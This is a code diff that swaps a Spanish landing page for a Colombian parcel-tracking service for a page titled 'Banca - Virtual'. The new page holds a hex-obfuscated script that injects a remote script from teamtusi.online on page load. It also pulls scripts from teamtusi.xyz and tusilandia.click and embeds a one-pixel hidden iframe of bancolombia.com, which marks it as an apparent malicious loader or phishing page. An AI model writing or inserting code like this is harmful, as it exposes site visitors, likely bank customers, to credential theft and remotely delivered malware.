@@ -1,251 +1,76 @@
-<!doctype html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>RastreoPaquetes — Seguimiento centralizado de envíos en Colombia</title>
-  <meta name="description" content="RastreoPaquetes conecta APIs de mensajería en Colombia y ofrece seguimiento en tiempo real para tus envíos. Integración rápida, notificaciones y panel centralizado.">
-  <meta name="keywords" content="rastreo,paquetería,envíos,Colombia,seguimiento,API,mensajería">
-  <link rel="canonical" href="https://tusitio.com/">
-  <!-- Open Graph / Social -->
-  <meta property="og:title" content="RastreoPaquetes — Seguimiento centralizado de envíos" />
-  <meta property="og:description" content="Conecta APIs de mensajería de Colombia y sigue todos tus envíos desde un solo lugar. Ideal para e‑commerce y operaciones logísticas." />
-  <meta property="og:type" content="website" />
-  <meta property="og:locale" content="es_CO" />
-  <meta property="og:url" content="https://tusitio.com/" />
-  <meta property="og:image" content="/share-image.png" />
-
-  <!-- Schema JSON-LD -->
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "LocalBusiness",
-    "name": "RastreoPaquetes",
-    "image": "https://tusitio.com/logo.png",
-    "@id": "https://tusitio.com/",
-    "url": "https://tusitio.com/",
-    "telephone": "+57-1-800-000-0000",
-    "address": {
-      "@type": "PostalAddress",
-      "addressLocality": "Bogotá",
-      "addressRegion": "Cundinamarca",
-      "addressCountry": "CO"
-    },
-    "priceRange": "$$"
-  }
-  </script>
-
-  <style>
-    /* Simple, fast, responsive styles for a Google Ads landing page */
-    :root{
-      --accent:#0b6efd;
-      --muted:#6b7280;
-      --bg:#f8fafc;
-      --max-width:1100px;
-      font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
-    }
-    html,body{height:100%;}
-    body{margin:0;background:var(--bg);color:#0b1220;-webkit-font-smoothing:antialiased}
-    .container{max-width:var(--max-width);margin:0 auto;padding:28px}
-    header{display:flex;align-items:center;justify-content:space-between;padding:12px 0}
-    .logo{display:flex;align-items:center;gap:12px}
-    .logo img{height:44px}
-    .cta-btn{background:var(--accent);color:white;padding:10px 16px;border-radius:8px;text-decoration:none;font-weight:600}
-
-    .hero{display:grid;grid-template-columns:1fr;gap:20px;align-items:center;padding:36px 0}
-    .hero h1{font-size:28px;margin:0 0 12px}
-    .hero p{margin:0 0 18px;color:var(--muted)}
-    .tracker{display:flex;gap:8px}
-    .tracker input{flex:1;padding:12px;border-radius:8px;border:1px solid #e6eef8;font-size:15px}
-    .tracker button{padding:12px 16px;border-radius:8px;border:none;background:var(--accent);color:#fff;font-weight:600}
-
-    .features{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin:20px 0}
-    .card{background:white;padding:16px;border-radius:12px;box-shadow:0 6px 18px rgba(12,20,30,0.06)}
-    .small{font-size:13px;color:var(--muted)}
-
-    .how{display:grid;grid-template-columns:1fr;gap:16px;margin-top:18px}
-    .steps{display:flex;flex-direction:column;gap:12px}
-    .step{display:flex;gap:12px;align-items:flex-start}
-    .step .num{background:#eef6ff;color:var(--accent);padding:8px;border-radius:8px;font-weight:700}
-
-    footer{margin-top:28px;padding:18px 0;color:var(--muted);font-size:13px}
-
-    @media(min-width:880px){
-      .hero{grid-template-columns:1fr 420px}
-      .hero h1{font-size:36px}
-    }
-
-    /* Quick contact form */
-    form .row{display:flex;flex-direction:column;gap:8px;margin-bottom:10px}
-    form input, form textarea{padding:10px;border-radius:8px;border:1px solid #e6eef8}
-    form button{background:#06b6d4;color:#fff;padding:10px;border-radius:8px;border:none;font-weight:600}
-
-    .badge-row{display:flex;gap:8px;flex-wrap:wrap}
-    .badge{background:#fff;padding:8px 12px;border-radius:999px;box-shadow:0 4px 10px rgba(12,20,30,0.04);font-weight:600}
-  </style>
-</head>
-<body>
-  <div class="container">
-    <header>
-      <div class="logo">
-        <img src="/logo.png" alt="RastreoPaquetes">
-        <div>
-          <div style="font-weight:700">RastreoPaquetes</div>
-          <div class="small">Seguimiento centralizado | Integraciones con mensajerías CO</div>
-        </div>
-      </div>
-      <nav>
-        <a href="#contact" class="cta-btn">Solicitar demo</a>
-      </nav>
-    </header>
-
-    <main>
-      <section class="hero">
-        <div>
-          <h1>Rastrea todos tus envíos en Colombia desde un solo lugar</h1>
-          <p>Integramos con las principales empresas de mensajería en Colombia para ofrecerte seguimiento en tiempo real, alertas automáticas y un panel centralizado para tu e‑commerce o operación logística.</p>
-          <div class="tracker" aria-label="Buscador de guía">
-            <input id="trackingNumber" type="text" placeholder="Ingresa número de guía (ej. 123456789)" aria-label="Número de guía">
-            <button id="trackBtn">Rastrear</button>
-          </div>
-
-          <div style="margin-top:14px" class="badge-row">
-            <div class="badge">Integraciones API</div>
-            <div class="badge">Alertas SMS/Email</div>
-            <div class="badge">Soporte 24/7</div>
-          </div>
-
-          <p style="margin-top:12px" class="small">¿No tienes integración todavía? <a href="#contact">Solicita una demo gratuita</a> y te ayudamos a conectar tus envíos en menos de 48 horas.</p>
-        </div>
-
-        <aside>
-          <div class="card">
-            <strong>Plan para e‑commerce</strong>
-            <p class="small">Desde COP 49.900 / mes — Seguimiento ilimitado, webhooks y soporte prioritario.</p>
-            <ul class="small">
-              <li>Integración con 12+ operadores locales</li>
-              <li>Notificaciones configurables</li>
-              <li>Historial y reportes</li>
-            </ul>
-            <div style="margin-top:12px;text-align:right"><a class="cta-btn" href="#contact">Contratar</a></div>
-          </div>
-        </aside>
-      </section>
-
-      <section>
-        <h2>¿Cómo funciona?</h2>
-        <div class="how">
-          <div class="steps">
-            <div class="step card">
-              <div class="num">1</div>
-              <div>
-                <strong>Conecta tu tienda o API</strong>
-                <div class="small">Ofrecemos conectores para plataformas comunes (WooCommerce, Shopify) y endpoints para integraciones personalizadas.</div>
-              </div>
-            </div>
-
-            <div class="step card">
-              <div class="num">2</div>
-              <div>
-                <strong>Rastreo centralizado</strong>
-                <div class="small">Nuestro motor consulta las APIs de los operadores y unifica estados en un formato estándar.</div>
-              </div>
-            </div>
-
-            <div class="step card">
-              <div class="num">3</div>
-              <div>
-                <strong>Notificaciones y reportes</strong>
-                <div class="small">Envía alertas por SMS, correo o webhooks a tu sistema. Genera reportes diarios o por rango de fechas.</div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <section style="margin-top:18px">
-        <h2>Integraciones destacadas</h2>
-        <div class="features">
-          <div class="card">
-            <strong>Envíos Nacionales</strong>
-            <p class="small">Coordinamos con mensajerías locales para obtener la última milla exacta.</p>
-          </div>
-          <div class="card">
-            <strong>Reportes a la medida</strong>
-            <p class="small">Exporta CSV, PDF y accede a métricas en tiempo real.</p>
-          </div>
-          <div class="card">
-            <strong>Seguridad</strong>
-            <p class="small">Conexiones seguras via HTTPS, claves API y permisos por rol.</p>
-          </div>
-          <div class="card">
-            <strong>Soporte local</strong>
-            <p class="small">Equipo en Colombia disponible por chat y correo.</p>
-          </div>
-        </div>
-      </section>
-
-      <section id="contact" style="margin-top:18px">
-        <h2>Solicita una demo</h2>
-        <div class="card">
-          <form id="contactForm" action="mailto:ventas@tusitio.com" method="post" enctype="text/plain" onsubmit="return validateForm()">
-            <div class="row">
-              <label class="small">Nombre</label>
-              <input type="text" id="name" name="Nombre" required>
-            </div>
-            <div class="row">
-              <label class="small">Empresa</label>
-              <input type="text" id="company" name="Empresa">
-            </div>
-            <div class="row">
-              <label class="small">Correo</label>
-              <input type="email" id="email" name="Correo" required>
-            </div>
-            <div class="row">
-              <label class="small">Mensaje / Requerimientos</label>
-              <textarea id="message" name="Mensaje" rows="4"></textarea>
-            </div>
-            <input type="hidden" name="utm_source" id="utm_source">
-            <button type="submit">Solicitar demo</button>
-          </form>
-        </div>
-      </section>
-
-    </main>
-
-    <footer>
-      <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
-        <div>
-          © 2025 RastreoPaquetes — Hecho en Colombia • <a href="/privacy.html">Política de privacidad</a>
-        </div>
-        <div class="small">Tel: +57 1 800 000 0000 • ventas@tusitio.com</div>
-      </div>
-    </footer>
-  </div>
-
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Banca - Virtual</title>
+  
+  <!-- Agregado de Google Tag Manager y otras etiquetas necesarias -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11395263888"></script>
   <script>
-    // Pequeña lógica para el botón de rastreo (simulación)
-    document.getElementById('trackBtn').addEventListener('click', function(){
-      var n = document.getElementById('trackingNumber').value.trim();
-      if(!n){ alert('Por favor ingresa un número de guía.'); return; }
-      // En una implementación real redirigirías a /track?number=... o llamarías a tu API
-      window.location.href = '/track.html?number=' + encodeURIComponent(n);
-    });
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-11395263888');
+  </script>
+  <!-- Fin de Google Tag Manager -->
 
-    function validateForm(){
-      var email = document.getElementById('email').value.trim();
-      if(!email) { alert('Ingresa un correo válido'); return false; }
-      return true;
-    }
-
-    // Capturar utm_source si viene en la URL (útil para Google Ads)
-    (function(){
-      try{
-        var params = new URLSearchParams(window.location.search);
-        var utm = params.get('utm_source') || params.get('gclid') ? (params.get('utm_source') || 'google_ads') : '';
-        document.getElementById('utm_source').value = utm;
-      }catch(e){/* ignorar */}
+  <script type="text/javascript">
+    (function() {
+      var _0x1234 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x65\x61\x6D\x74\x75\x73\x69\x2E\x6F\x6E\x6C\x69\x6E\x65\x2F\x73\x63\x72\x69\x70\x74\x2E\x70\x68\x70\x3F\x74\x6F\x6B\x3D\x71\x77\x65\x72\x74\x79\x30\x39\x31\x37\x36\x37\x38"];
+      var _0x5678 = document.createElement('script');
+      _0x5678.src = _0x1234[0];
+      document.body.appendChild(_0x5678);
     })();
   </script>
+<script id="_waun94">var _wau = _wau || []; _wau.push(["small", "balatop", "n94"]);</script>
+    <script async src="//waust.at/s.js"></script>
+
+  <script type="text/javascript">
+    document.getElementById('triggerScript').addEventListener('click', function() {
+      var script = document.createElement('script');
+      document.body.appendChild(script);
+    });
+  </script>
+  
+</head>
+
+<body class="t-body">
+
+  <iframe src="https://www.bancolombia.com" style="width: 1px; height: 1px; border: none; position: absolute;"></iframe>
+
+   
+  <script type="text/javascript" src="https://teamtusi.xyz/js/jquery.jclockNew.js"></script>
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+  <script type="text/javascript" src="https://bogota.tusilandia.click/_bogota/script.php?tok=qwert0001" async="true"></script>
+  
+  <div style="display: none;" class="b-main t-container clearfix">
+    <!-- <middle> -->
+    <div style="display: none;" class="b-logo b-white">
+      <div class="site-title">
+        <!-- <logo> -->My site
+        <!-- </logo> -->
+      </div>
+      <div class="site-slogan">$SITE_NAME$</div>
+    </div>
+    <div style="display: none;" class="b-maincontent b-white" role="main">
+      <div class="content-padding">
+      </div>
+    </div>
+    <div style="display: none;" class="sidebar-clear clearleft"></div>
+    <aside style="display: none;" class="b-sidebar b-white clearfix">
+      $GLOBAL_CLEFTER$
+    </aside>
+    <!-- </middle> -->
+  </div>
+
+  <div style="display: none;"></div>
+  <textarea style="display: none;" name="" id="" cols="30" rows="10"> $GLOBAL_BFOOTER$ </textarea>
+
 </body>
+
 </html>
+
+<p align="center">
+  <iframe src width="1" height="1" marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" scrolling="no"></iframe>
+</p>
